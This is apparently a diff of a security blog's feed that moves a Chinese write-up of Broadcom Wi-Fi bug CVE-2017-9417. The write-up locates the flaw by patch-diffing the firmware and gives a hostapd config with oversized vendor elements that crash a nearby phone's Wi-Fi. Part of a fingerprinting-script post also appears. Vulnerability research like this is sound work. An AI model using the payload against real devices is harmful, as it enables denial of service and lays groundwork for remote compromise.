OptionParser</div><div class="line"><span class="keyword">from</span>   modules            <span class="keyword">import</span> finger</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    usage= <span class="string">'''%prog --host  host --port  port --finger  &lt;all|app_name&gt;   \r\nExample:%prog  --url  http://127.0.0.1    --finger phpmyadmin  '''</span></div><div class="line">    parser = OptionParser(usage=usage)</div><div class="line">    parser.add_option(<span class="string">"-u"</span>, <span class="string">"--url"</span>, dest=<span class="string">"url"</span>, help=<span class="string">"target url"</span>)</div><div class="line">    parser.add_option(<span class="string">"-f"</span>, <span class="string">"--finger"</span>, dest=<span class="string">"finger"</span>, help=<span class="string">"finger_db app_name,default all "</span>, default=<span class="string">"all"</span>)</div><div class="line">    options, arguments = parser.parse_args()</div><div class="line">    <span class="keyword">if</span> options.url == <span class="keyword">None</span> :</div><div class="line">        parser.print_help() </div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    db = MySQL(config.db_config)</div><div class="line">    sql_finger_where=<span class="string">' '</span>  <span class="keyword">if</span> options.finger == <span class="string">'all'</span> <span class="keyword">else</span> <span class="string">"  and  app_name='%s' "</span>  % options.finger</div><div class="line">    db.query(<span class="string">"SELECT  * from  pw_finger_db  where  `enable`=1   %s "</span>  % sql_finger_where)</div><div class="line">    fingers = db.fetch_all()</div><div class="line">    <span class="keyword">if</span> len(fingers) == <span class="number">0</span> :</div><div class="line">        util.log(<span class="string">'finger app_name %s not found'</span> % options.finger ,<span class="number">3</span>,<span class="string">'finger'</span>) </div><div class="line">    config.set(<span class="string">"fingers"</span>,fingers)</div><div class="line">    util.log(<span class="string">"load fingers count %d"</span> % len(fingers),<span class="number">1</span>,<span class="string">'finger'</span>)</div><div class="line">    finger.get_web_app(options.url)</div></pre></td></tr></table></figure>
-<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15109322329056.jpg" alt="img"></p>
-<h3 id="批量识别"><a href="#批量识别" class="headerlink" title="批量识别"></a>批量识别</h3><p> 可以使用线程池来实现批量指纹识别。</p>
-<h3 id="指纹结果"><a href="#指纹结果" class="headerlink" title="指纹结果"></a>指纹结果</h3><p>融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。</p>
-<h2 id="yafinger"><a href="#yafinger" class="headerlink" title="yafinger"></a>yafinger</h2><p>yet another  web  fingerprinter<br><a href="https://github.com/yaseng/yafinger" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/yaseng/yafinger</a></p>
-<h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ol>
-<li>指纹库需要补充</li>
-<li>可以不局限于web指纹</li>
-<li>某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则</li>
-</ol>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用
-    
-    </summary>
-    
-      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="指纹识别" scheme="http://www.future-sec.com/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
     
   </entry>
   
@@ -686,50 +1217,6 @@
   </entry>
   
   <entry>
-    <title>BROADCOM WI-FI芯片漏洞分析二</title>
-    <link href="http://www.future-sec.com/broadcom-wifi-2.html"/>
-    <id>http://www.future-sec.com/broadcom-wifi-2.html</id>
-    <published>2017-08-29T16:00:00.000Z</published>
-    <updated>2017-12-21T07:33:35.154Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。<br>1、首先是定位到帧提取函数<br>2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。<br>3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">uint8_t* buffer = malloc(<span class="number">256</span>);</div><div class="line">uint8_t* pos = buffer;</div><div class="line"><span class="comment">//Copying the initial (static) information</span></div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., <span class="number">101</span>);</div><div class="line">memcpy(pos, linkid_ie + <span class="number">0x8</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;   <span class="comment">//Initiator MAC</span></div><div class="line">memcpy(pos, linkid_ie + <span class="number">0xE</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;    <span class="comment">//Responder MAC</span></div><div class="line">*pos = transaction_seq;             pos++;                   <span class="comment">//TransactionSeq</span></div><div class="line">memcpy(pos, linkid_ie, <span class="number">0x14</span>);       pos += <span class="number">0x14</span>;             <span class="comment">//LinkID-IE</span></div><div class="line"><span class="comment">//Copying the RSN IE</span></div><div class="line">uint8_t* rsn_ie = bcm_parse_tlvs(..., <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (rsn_ie[<span class="number">1</span>] + <span class="number">2</span> + (pos - buffer) &gt; <span class="number">0xFF</span>) &#123;</div><div class="line">    ... <span class="comment">//Handle overflow</span></div><div class="line">&#125;</div><div class="line">memcpy(pos, rsn_ie, rsn_ie[<span class="number">1</span>] + <span class="number">2</span>); pos += rsn_ie[<span class="number">1</span>] + <span class="number">2</span>;    <span class="comment">//RSN-IE</span></div><div class="line"><span class="comment">//Copying the remaining IEs</span></div><div class="line">uint8_t* timeout_ie = bcm_parse_tlvs(..., <span class="number">56</span>);</div><div class="line">uint8_t* ft_ie      = bcm_parse_tlvs(..., <span class="number">55</span>);</div><div class="line">memcpy(pos, timeout_ie, <span class="number">0x7</span>);       pos += <span class="number">0x7</span>;              <span class="comment">//Timeout Interval IE</span></div><div class="line">memcpy(pos, ft_ie, <span class="number">0x54</span>);           pos += <span class="number">0x54</span>;             <span class="comment">//Fast-Transition IE</span></div></pre></td></tr></table></figure></p>
-<p>到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。</p>
-<h2 id="切入主题"><a href="#切入主题" class="headerlink" title="切入主题"></a>切入主题</h2><p>1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。<br>2、涉及到的相关知识将以链接形式详细给出</p>
-<h2 id="CVE-2017-9417漏洞分析"><a href="#CVE-2017-9417漏洞分析" class="headerlink" title="CVE-2017-9417漏洞分析"></a>CVE-2017-9417漏洞分析</h2><h3 id="分析ROM固件找到漏洞"><a href="#分析ROM固件找到漏洞" class="headerlink" title="分析ROM固件找到漏洞"></a>分析ROM固件找到漏洞</h3><p>1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：<br>type (1 byte), length (1 byte), data of (length) bytes<br>2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：<br><img src="/images/wifi6.png" alt="img"><br>3、定位漏洞函数<br>·    bindiff对比6月份补丁跟7月份补丁的差异<br>·    第一步：将两个补丁版本都dump下来。<br>·    第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff<br>·    第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：<br><img src="/images/wifi7.png" alt="img"><br><img src="/images/wifi8.png" alt="img"><br>·    第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。<br>    跟踪到造成漏洞的函数。<br> <img src="/images/wifi9.png" alt="img"><br><img src="/images/wifi10.png" alt="img">   </p>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。<br>assocresp_ies数据<br><img src="/images/wifi11.png" alt="img"><br>分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。<br><img src="/images/wifi12.png" alt="img"><br>如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。<br><img src="/images/wifi13.png" alt="img"><br>缓冲区分配ida中参考在<a href="http://note.youdao.com/noteshare?id=7cb193be6f06643ef49f5f780bdb78c9" rel="external nofollow noopener noreferrer" target="_blank">这里</a></p>
-<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。<br>hostapd 安装：链接</p>
-<ol>
-<li>下载hostapd到ubuntu 14.04</li>
-<li>解压hostapd</li>
-<li>配置hostapd，使它编译为支持nl80211驱动<br>cp defconfig .config<br>vi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。</li>
-<li>make #编译hostapd ，编译过程会报错，是因为缺少libnl库<br><img src="/images/wifi14.png" alt="img"><br>解决方法：下载并编译安装libnl 可以到主页下载：<a href="http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：" rel="external nofollow noopener noreferrer" target="_blank">http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：</a><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/tgraf/libnl-1.1-stable.git</span></div><div class="line">cd libnl<span class="number">-1.1</span>-stable</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>5、make编译<br><img src="/images/wifi15.png" alt="img"><br>在启动hostapd时指定配置文件<br>1、新建配置文件 在/etc/目录新建一个文件hostapd.conf<br>2、配置文件内容<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># WiFi Hotspot</div><div class="line">interface=wlan0</div><div class="line">driver=nl80211</div><div class="line">#Access Point</div><div class="line">ssid=YourNetworkNameHere</div><div class="line">hw_mode=g</div><div class="line"># WiFi Channel:</div><div class="line">channel=1</div><div class="line">macaddr_acl=0</div><div class="line">auth_algs=1</div><div class="line">ignore_broadcast_ssid=0</div><div class="line"></div><div class="line">assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div><div class="line">vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div></pre></td></tr></table></figure></p>
-<p>1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；<br>2.driver：设定无线驱动，我这里是nl80211；<br>3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.<br>4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b<br>5.channel:设置hostapd操作的channel.<br>6.ignore_broadcast_ssid: 开启或禁用广播ssid.<br>7.macaddr_acl: MAC地址过滤. .<br>8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）<br>3、启动 hostpad<br>1.启动<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
-<p>2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo nmcli nm wifi off</div><div class="line">sudo rfkill unblock wlan</div></pre></td></tr></table></figure></p>
-<p>然后继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
-<p>3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、Ubuntu上编译hostapd：<a href="http://blog.csdn.net/hnllc2012/article/details/49151137" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/hnllc2012/article/details/49151137</a><br>2、博客参考：<a href="http://boosterok.com/blog/broadpwn1/" rel="external nofollow noopener noreferrer" target="_blank">http://boosterok.com/blog/broadpwn1/</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。&lt;br&gt;1
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
-    
-      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
-    
-  </entry>
-  
-  <entry>
     <title>BROADCOM WI-FI芯片漏洞分析一</title>
     <link href="http://www.future-sec.com/broadcom-wifi-1.html"/>
     <id>http://www.future-sec.com/broadcom-wifi-1.html</id>
@@ -781,6 +1268,50 @@
   </entry>
   
   <entry>
+    <title>BROADCOM WI-FI芯片漏洞分析二</title>
+    <link href="http://www.future-sec.com/broadcom-wifi-2.html"/>
+    <id>http://www.future-sec.com/broadcom-wifi-2.html</id>
+    <published>2017-08-29T16:00:00.000Z</published>
+    <updated>2017-12-21T07:33:35.154Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。<br>1、首先是定位到帧提取函数<br>2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。<br>3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">uint8_t* buffer = malloc(<span class="number">256</span>);</div><div class="line">uint8_t* pos = buffer;</div><div class="line"><span class="comment">//Copying the initial (static) information</span></div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., <span class="number">101</span>);</div><div class="line">memcpy(pos, linkid_ie + <span class="number">0x8</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;   <span class="comment">//Initiator MAC</span></div><div class="line">memcpy(pos, linkid_ie + <span class="number">0xE</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;    <span class="comment">//Responder MAC</span></div><div class="line">*pos = transaction_seq;             pos++;                   <span class="comment">//TransactionSeq</span></div><div class="line">memcpy(pos, linkid_ie, <span class="number">0x14</span>);       pos += <span class="number">0x14</span>;             <span class="comment">//LinkID-IE</span></div><div class="line"><span class="comment">//Copying the RSN IE</span></div><div class="line">uint8_t* rsn_ie = bcm_parse_tlvs(..., <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (rsn_ie[<span class="number">1</span>] + <span class="number">2</span> + (pos - buffer) &gt; <span class="number">0xFF</span>) &#123;</div><div class="line">    ... <span class="comment">//Handle overflow</span></div><div class="line">&#125;</div><div class="line">memcpy(pos, rsn_ie, rsn_ie[<span class="number">1</span>] + <span class="number">2</span>); pos += rsn_ie[<span class="number">1</span>] + <span class="number">2</span>;    <span class="comment">//RSN-IE</span></div><div class="line"><span class="comment">//Copying the remaining IEs</span></div><div class="line">uint8_t* timeout_ie = bcm_parse_tlvs(..., <span class="number">56</span>);</div><div class="line">uint8_t* ft_ie      = bcm_parse_tlvs(..., <span class="number">55</span>);</div><div class="line">memcpy(pos, timeout_ie, <span class="number">0x7</span>);       pos += <span class="number">0x7</span>;              <span class="comment">//Timeout Interval IE</span></div><div class="line">memcpy(pos, ft_ie, <span class="number">0x54</span>);           pos += <span class="number">0x54</span>;             <span class="comment">//Fast-Transition IE</span></div></pre></td></tr></table></figure></p>
+<p>到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。</p>
+<h2 id="切入主题"><a href="#切入主题" class="headerlink" title="切入主题"></a>切入主题</h2><p>1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。<br>2、涉及到的相关知识将以链接形式详细给出</p>
+<h2 id="CVE-2017-9417漏洞分析"><a href="#CVE-2017-9417漏洞分析" class="headerlink" title="CVE-2017-9417漏洞分析"></a>CVE-2017-9417漏洞分析</h2><h3 id="分析ROM固件找到漏洞"><a href="#分析ROM固件找到漏洞" class="headerlink" title="分析ROM固件找到漏洞"></a>分析ROM固件找到漏洞</h3><p>1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：<br>type (1 byte), length (1 byte), data of (length) bytes<br>2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：<br><img src="/images/wifi6.png" alt="img"><br>3、定位漏洞函数<br>·    bindiff对比6月份补丁跟7月份补丁的差异<br>·    第一步：将两个补丁版本都dump下来。<br>·    第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff<br>·    第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：<br><img src="/images/wifi7.png" alt="img"><br><img src="/images/wifi8.png" alt="img"><br>·    第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。<br>    跟踪到造成漏洞的函数。<br> <img src="/images/wifi9.png" alt="img"><br><img src="/images/wifi10.png" alt="img">   </p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。<br>assocresp_ies数据<br><img src="/images/wifi11.png" alt="img"><br>分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。<br><img src="/images/wifi12.png" alt="img"><br>如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。<br><img src="/images/wifi13.png" alt="img"><br>缓冲区分配ida中参考在<a href="http://note.youdao.com/noteshare?id=7cb193be6f06643ef49f5f780bdb78c9" rel="external nofollow noopener noreferrer" target="_blank">这里</a></p>
+<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。<br>hostapd 安装：链接</p>
+<ol>
+<li>下载hostapd到ubuntu 14.04</li>
+<li>解压hostapd</li>
+<li>配置hostapd，使它编译为支持nl80211驱动<br>cp defconfig .config<br>vi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。</li>
+<li>make #编译hostapd ，编译过程会报错，是因为缺少libnl库<br><img src="/images/wifi14.png" alt="img"><br>解决方法：下载并编译安装libnl 可以到主页下载：<a href="http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：" rel="external nofollow noopener noreferrer" target="_blank">http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：</a><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/tgraf/libnl-1.1-stable.git</span></div><div class="line">cd libnl<span class="number">-1.1</span>-stable</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>5、make编译<br><img src="/images/wifi15.png" alt="img"><br>在启动hostapd时指定配置文件<br>1、新建配置文件 在/etc/目录新建一个文件hostapd.conf<br>2、配置文件内容<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># WiFi Hotspot</div><div class="line">interface=wlan0</div><div class="line">driver=nl80211</div><div class="line">#Access Point</div><div class="line">ssid=YourNetworkNameHere</div><div class="line">hw_mode=g</div><div class="line"># WiFi Channel:</div><div class="line">channel=1</div><div class="line">macaddr_acl=0</div><div class="line">auth_algs=1</div><div class="line">ignore_broadcast_ssid=0</div><div class="line"></div><div class="line">assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div><div class="line">vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div></pre></td></tr></table></figure></p>
+<p>1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；<br>2.driver：设定无线驱动，我这里是nl80211；<br>3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.<br>4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b<br>5.channel:设置hostapd操作的channel.<br>6.ignore_broadcast_ssid: 开启或禁用广播ssid.<br>7.macaddr_acl: MAC地址过滤. .<br>8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）<br>3、启动 hostpad<br>1.启动<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
+<p>2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo nmcli nm wifi off</div><div class="line">sudo rfkill unblock wlan</div></pre></td></tr></table></figure></p>
+<p>然后继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
+<p>3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、Ubuntu上编译hostapd：<a href="http://blog.csdn.net/hnllc2012/article/details/49151137" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/hnllc2012/article/details/49151137</a><br>2、博客参考：<a href="http://boosterok.com/blog/broadpwn1/" rel="external nofollow noopener noreferrer" target="_blank">http://boosterok.com/blog/broadpwn1/</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。&lt;br&gt;1
+    
+    </summary>
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
+    
+      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
+    
+  </entry>
+  
+  <entry>
     <title>中间件漏洞检测框架(F-MiddlewareScan)</title>
     <link href="http://www.future-sec.com/f-middlewarescan.html"/>
     <id>http://www.future-sec.com/f-middlewarescan.html</id>
@@ -808,195 +1339,6 @@
       <category term="python" scheme="http://www.future-sec.com/tags/python/"/>
     
       <category term="自动化检测" scheme="http://www.future-sec.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>简单验证码识别及工具编写思路</title>
-    <link href="http://www.future-sec.com/verification_code.html"/>
-    <id>http://www.future-sec.com/verification_code.html</id>
-    <published>2016-03-06T16:00:00.000Z</published>
-    <updated>2017-07-10T19:39:19.295Z</updated>
-    
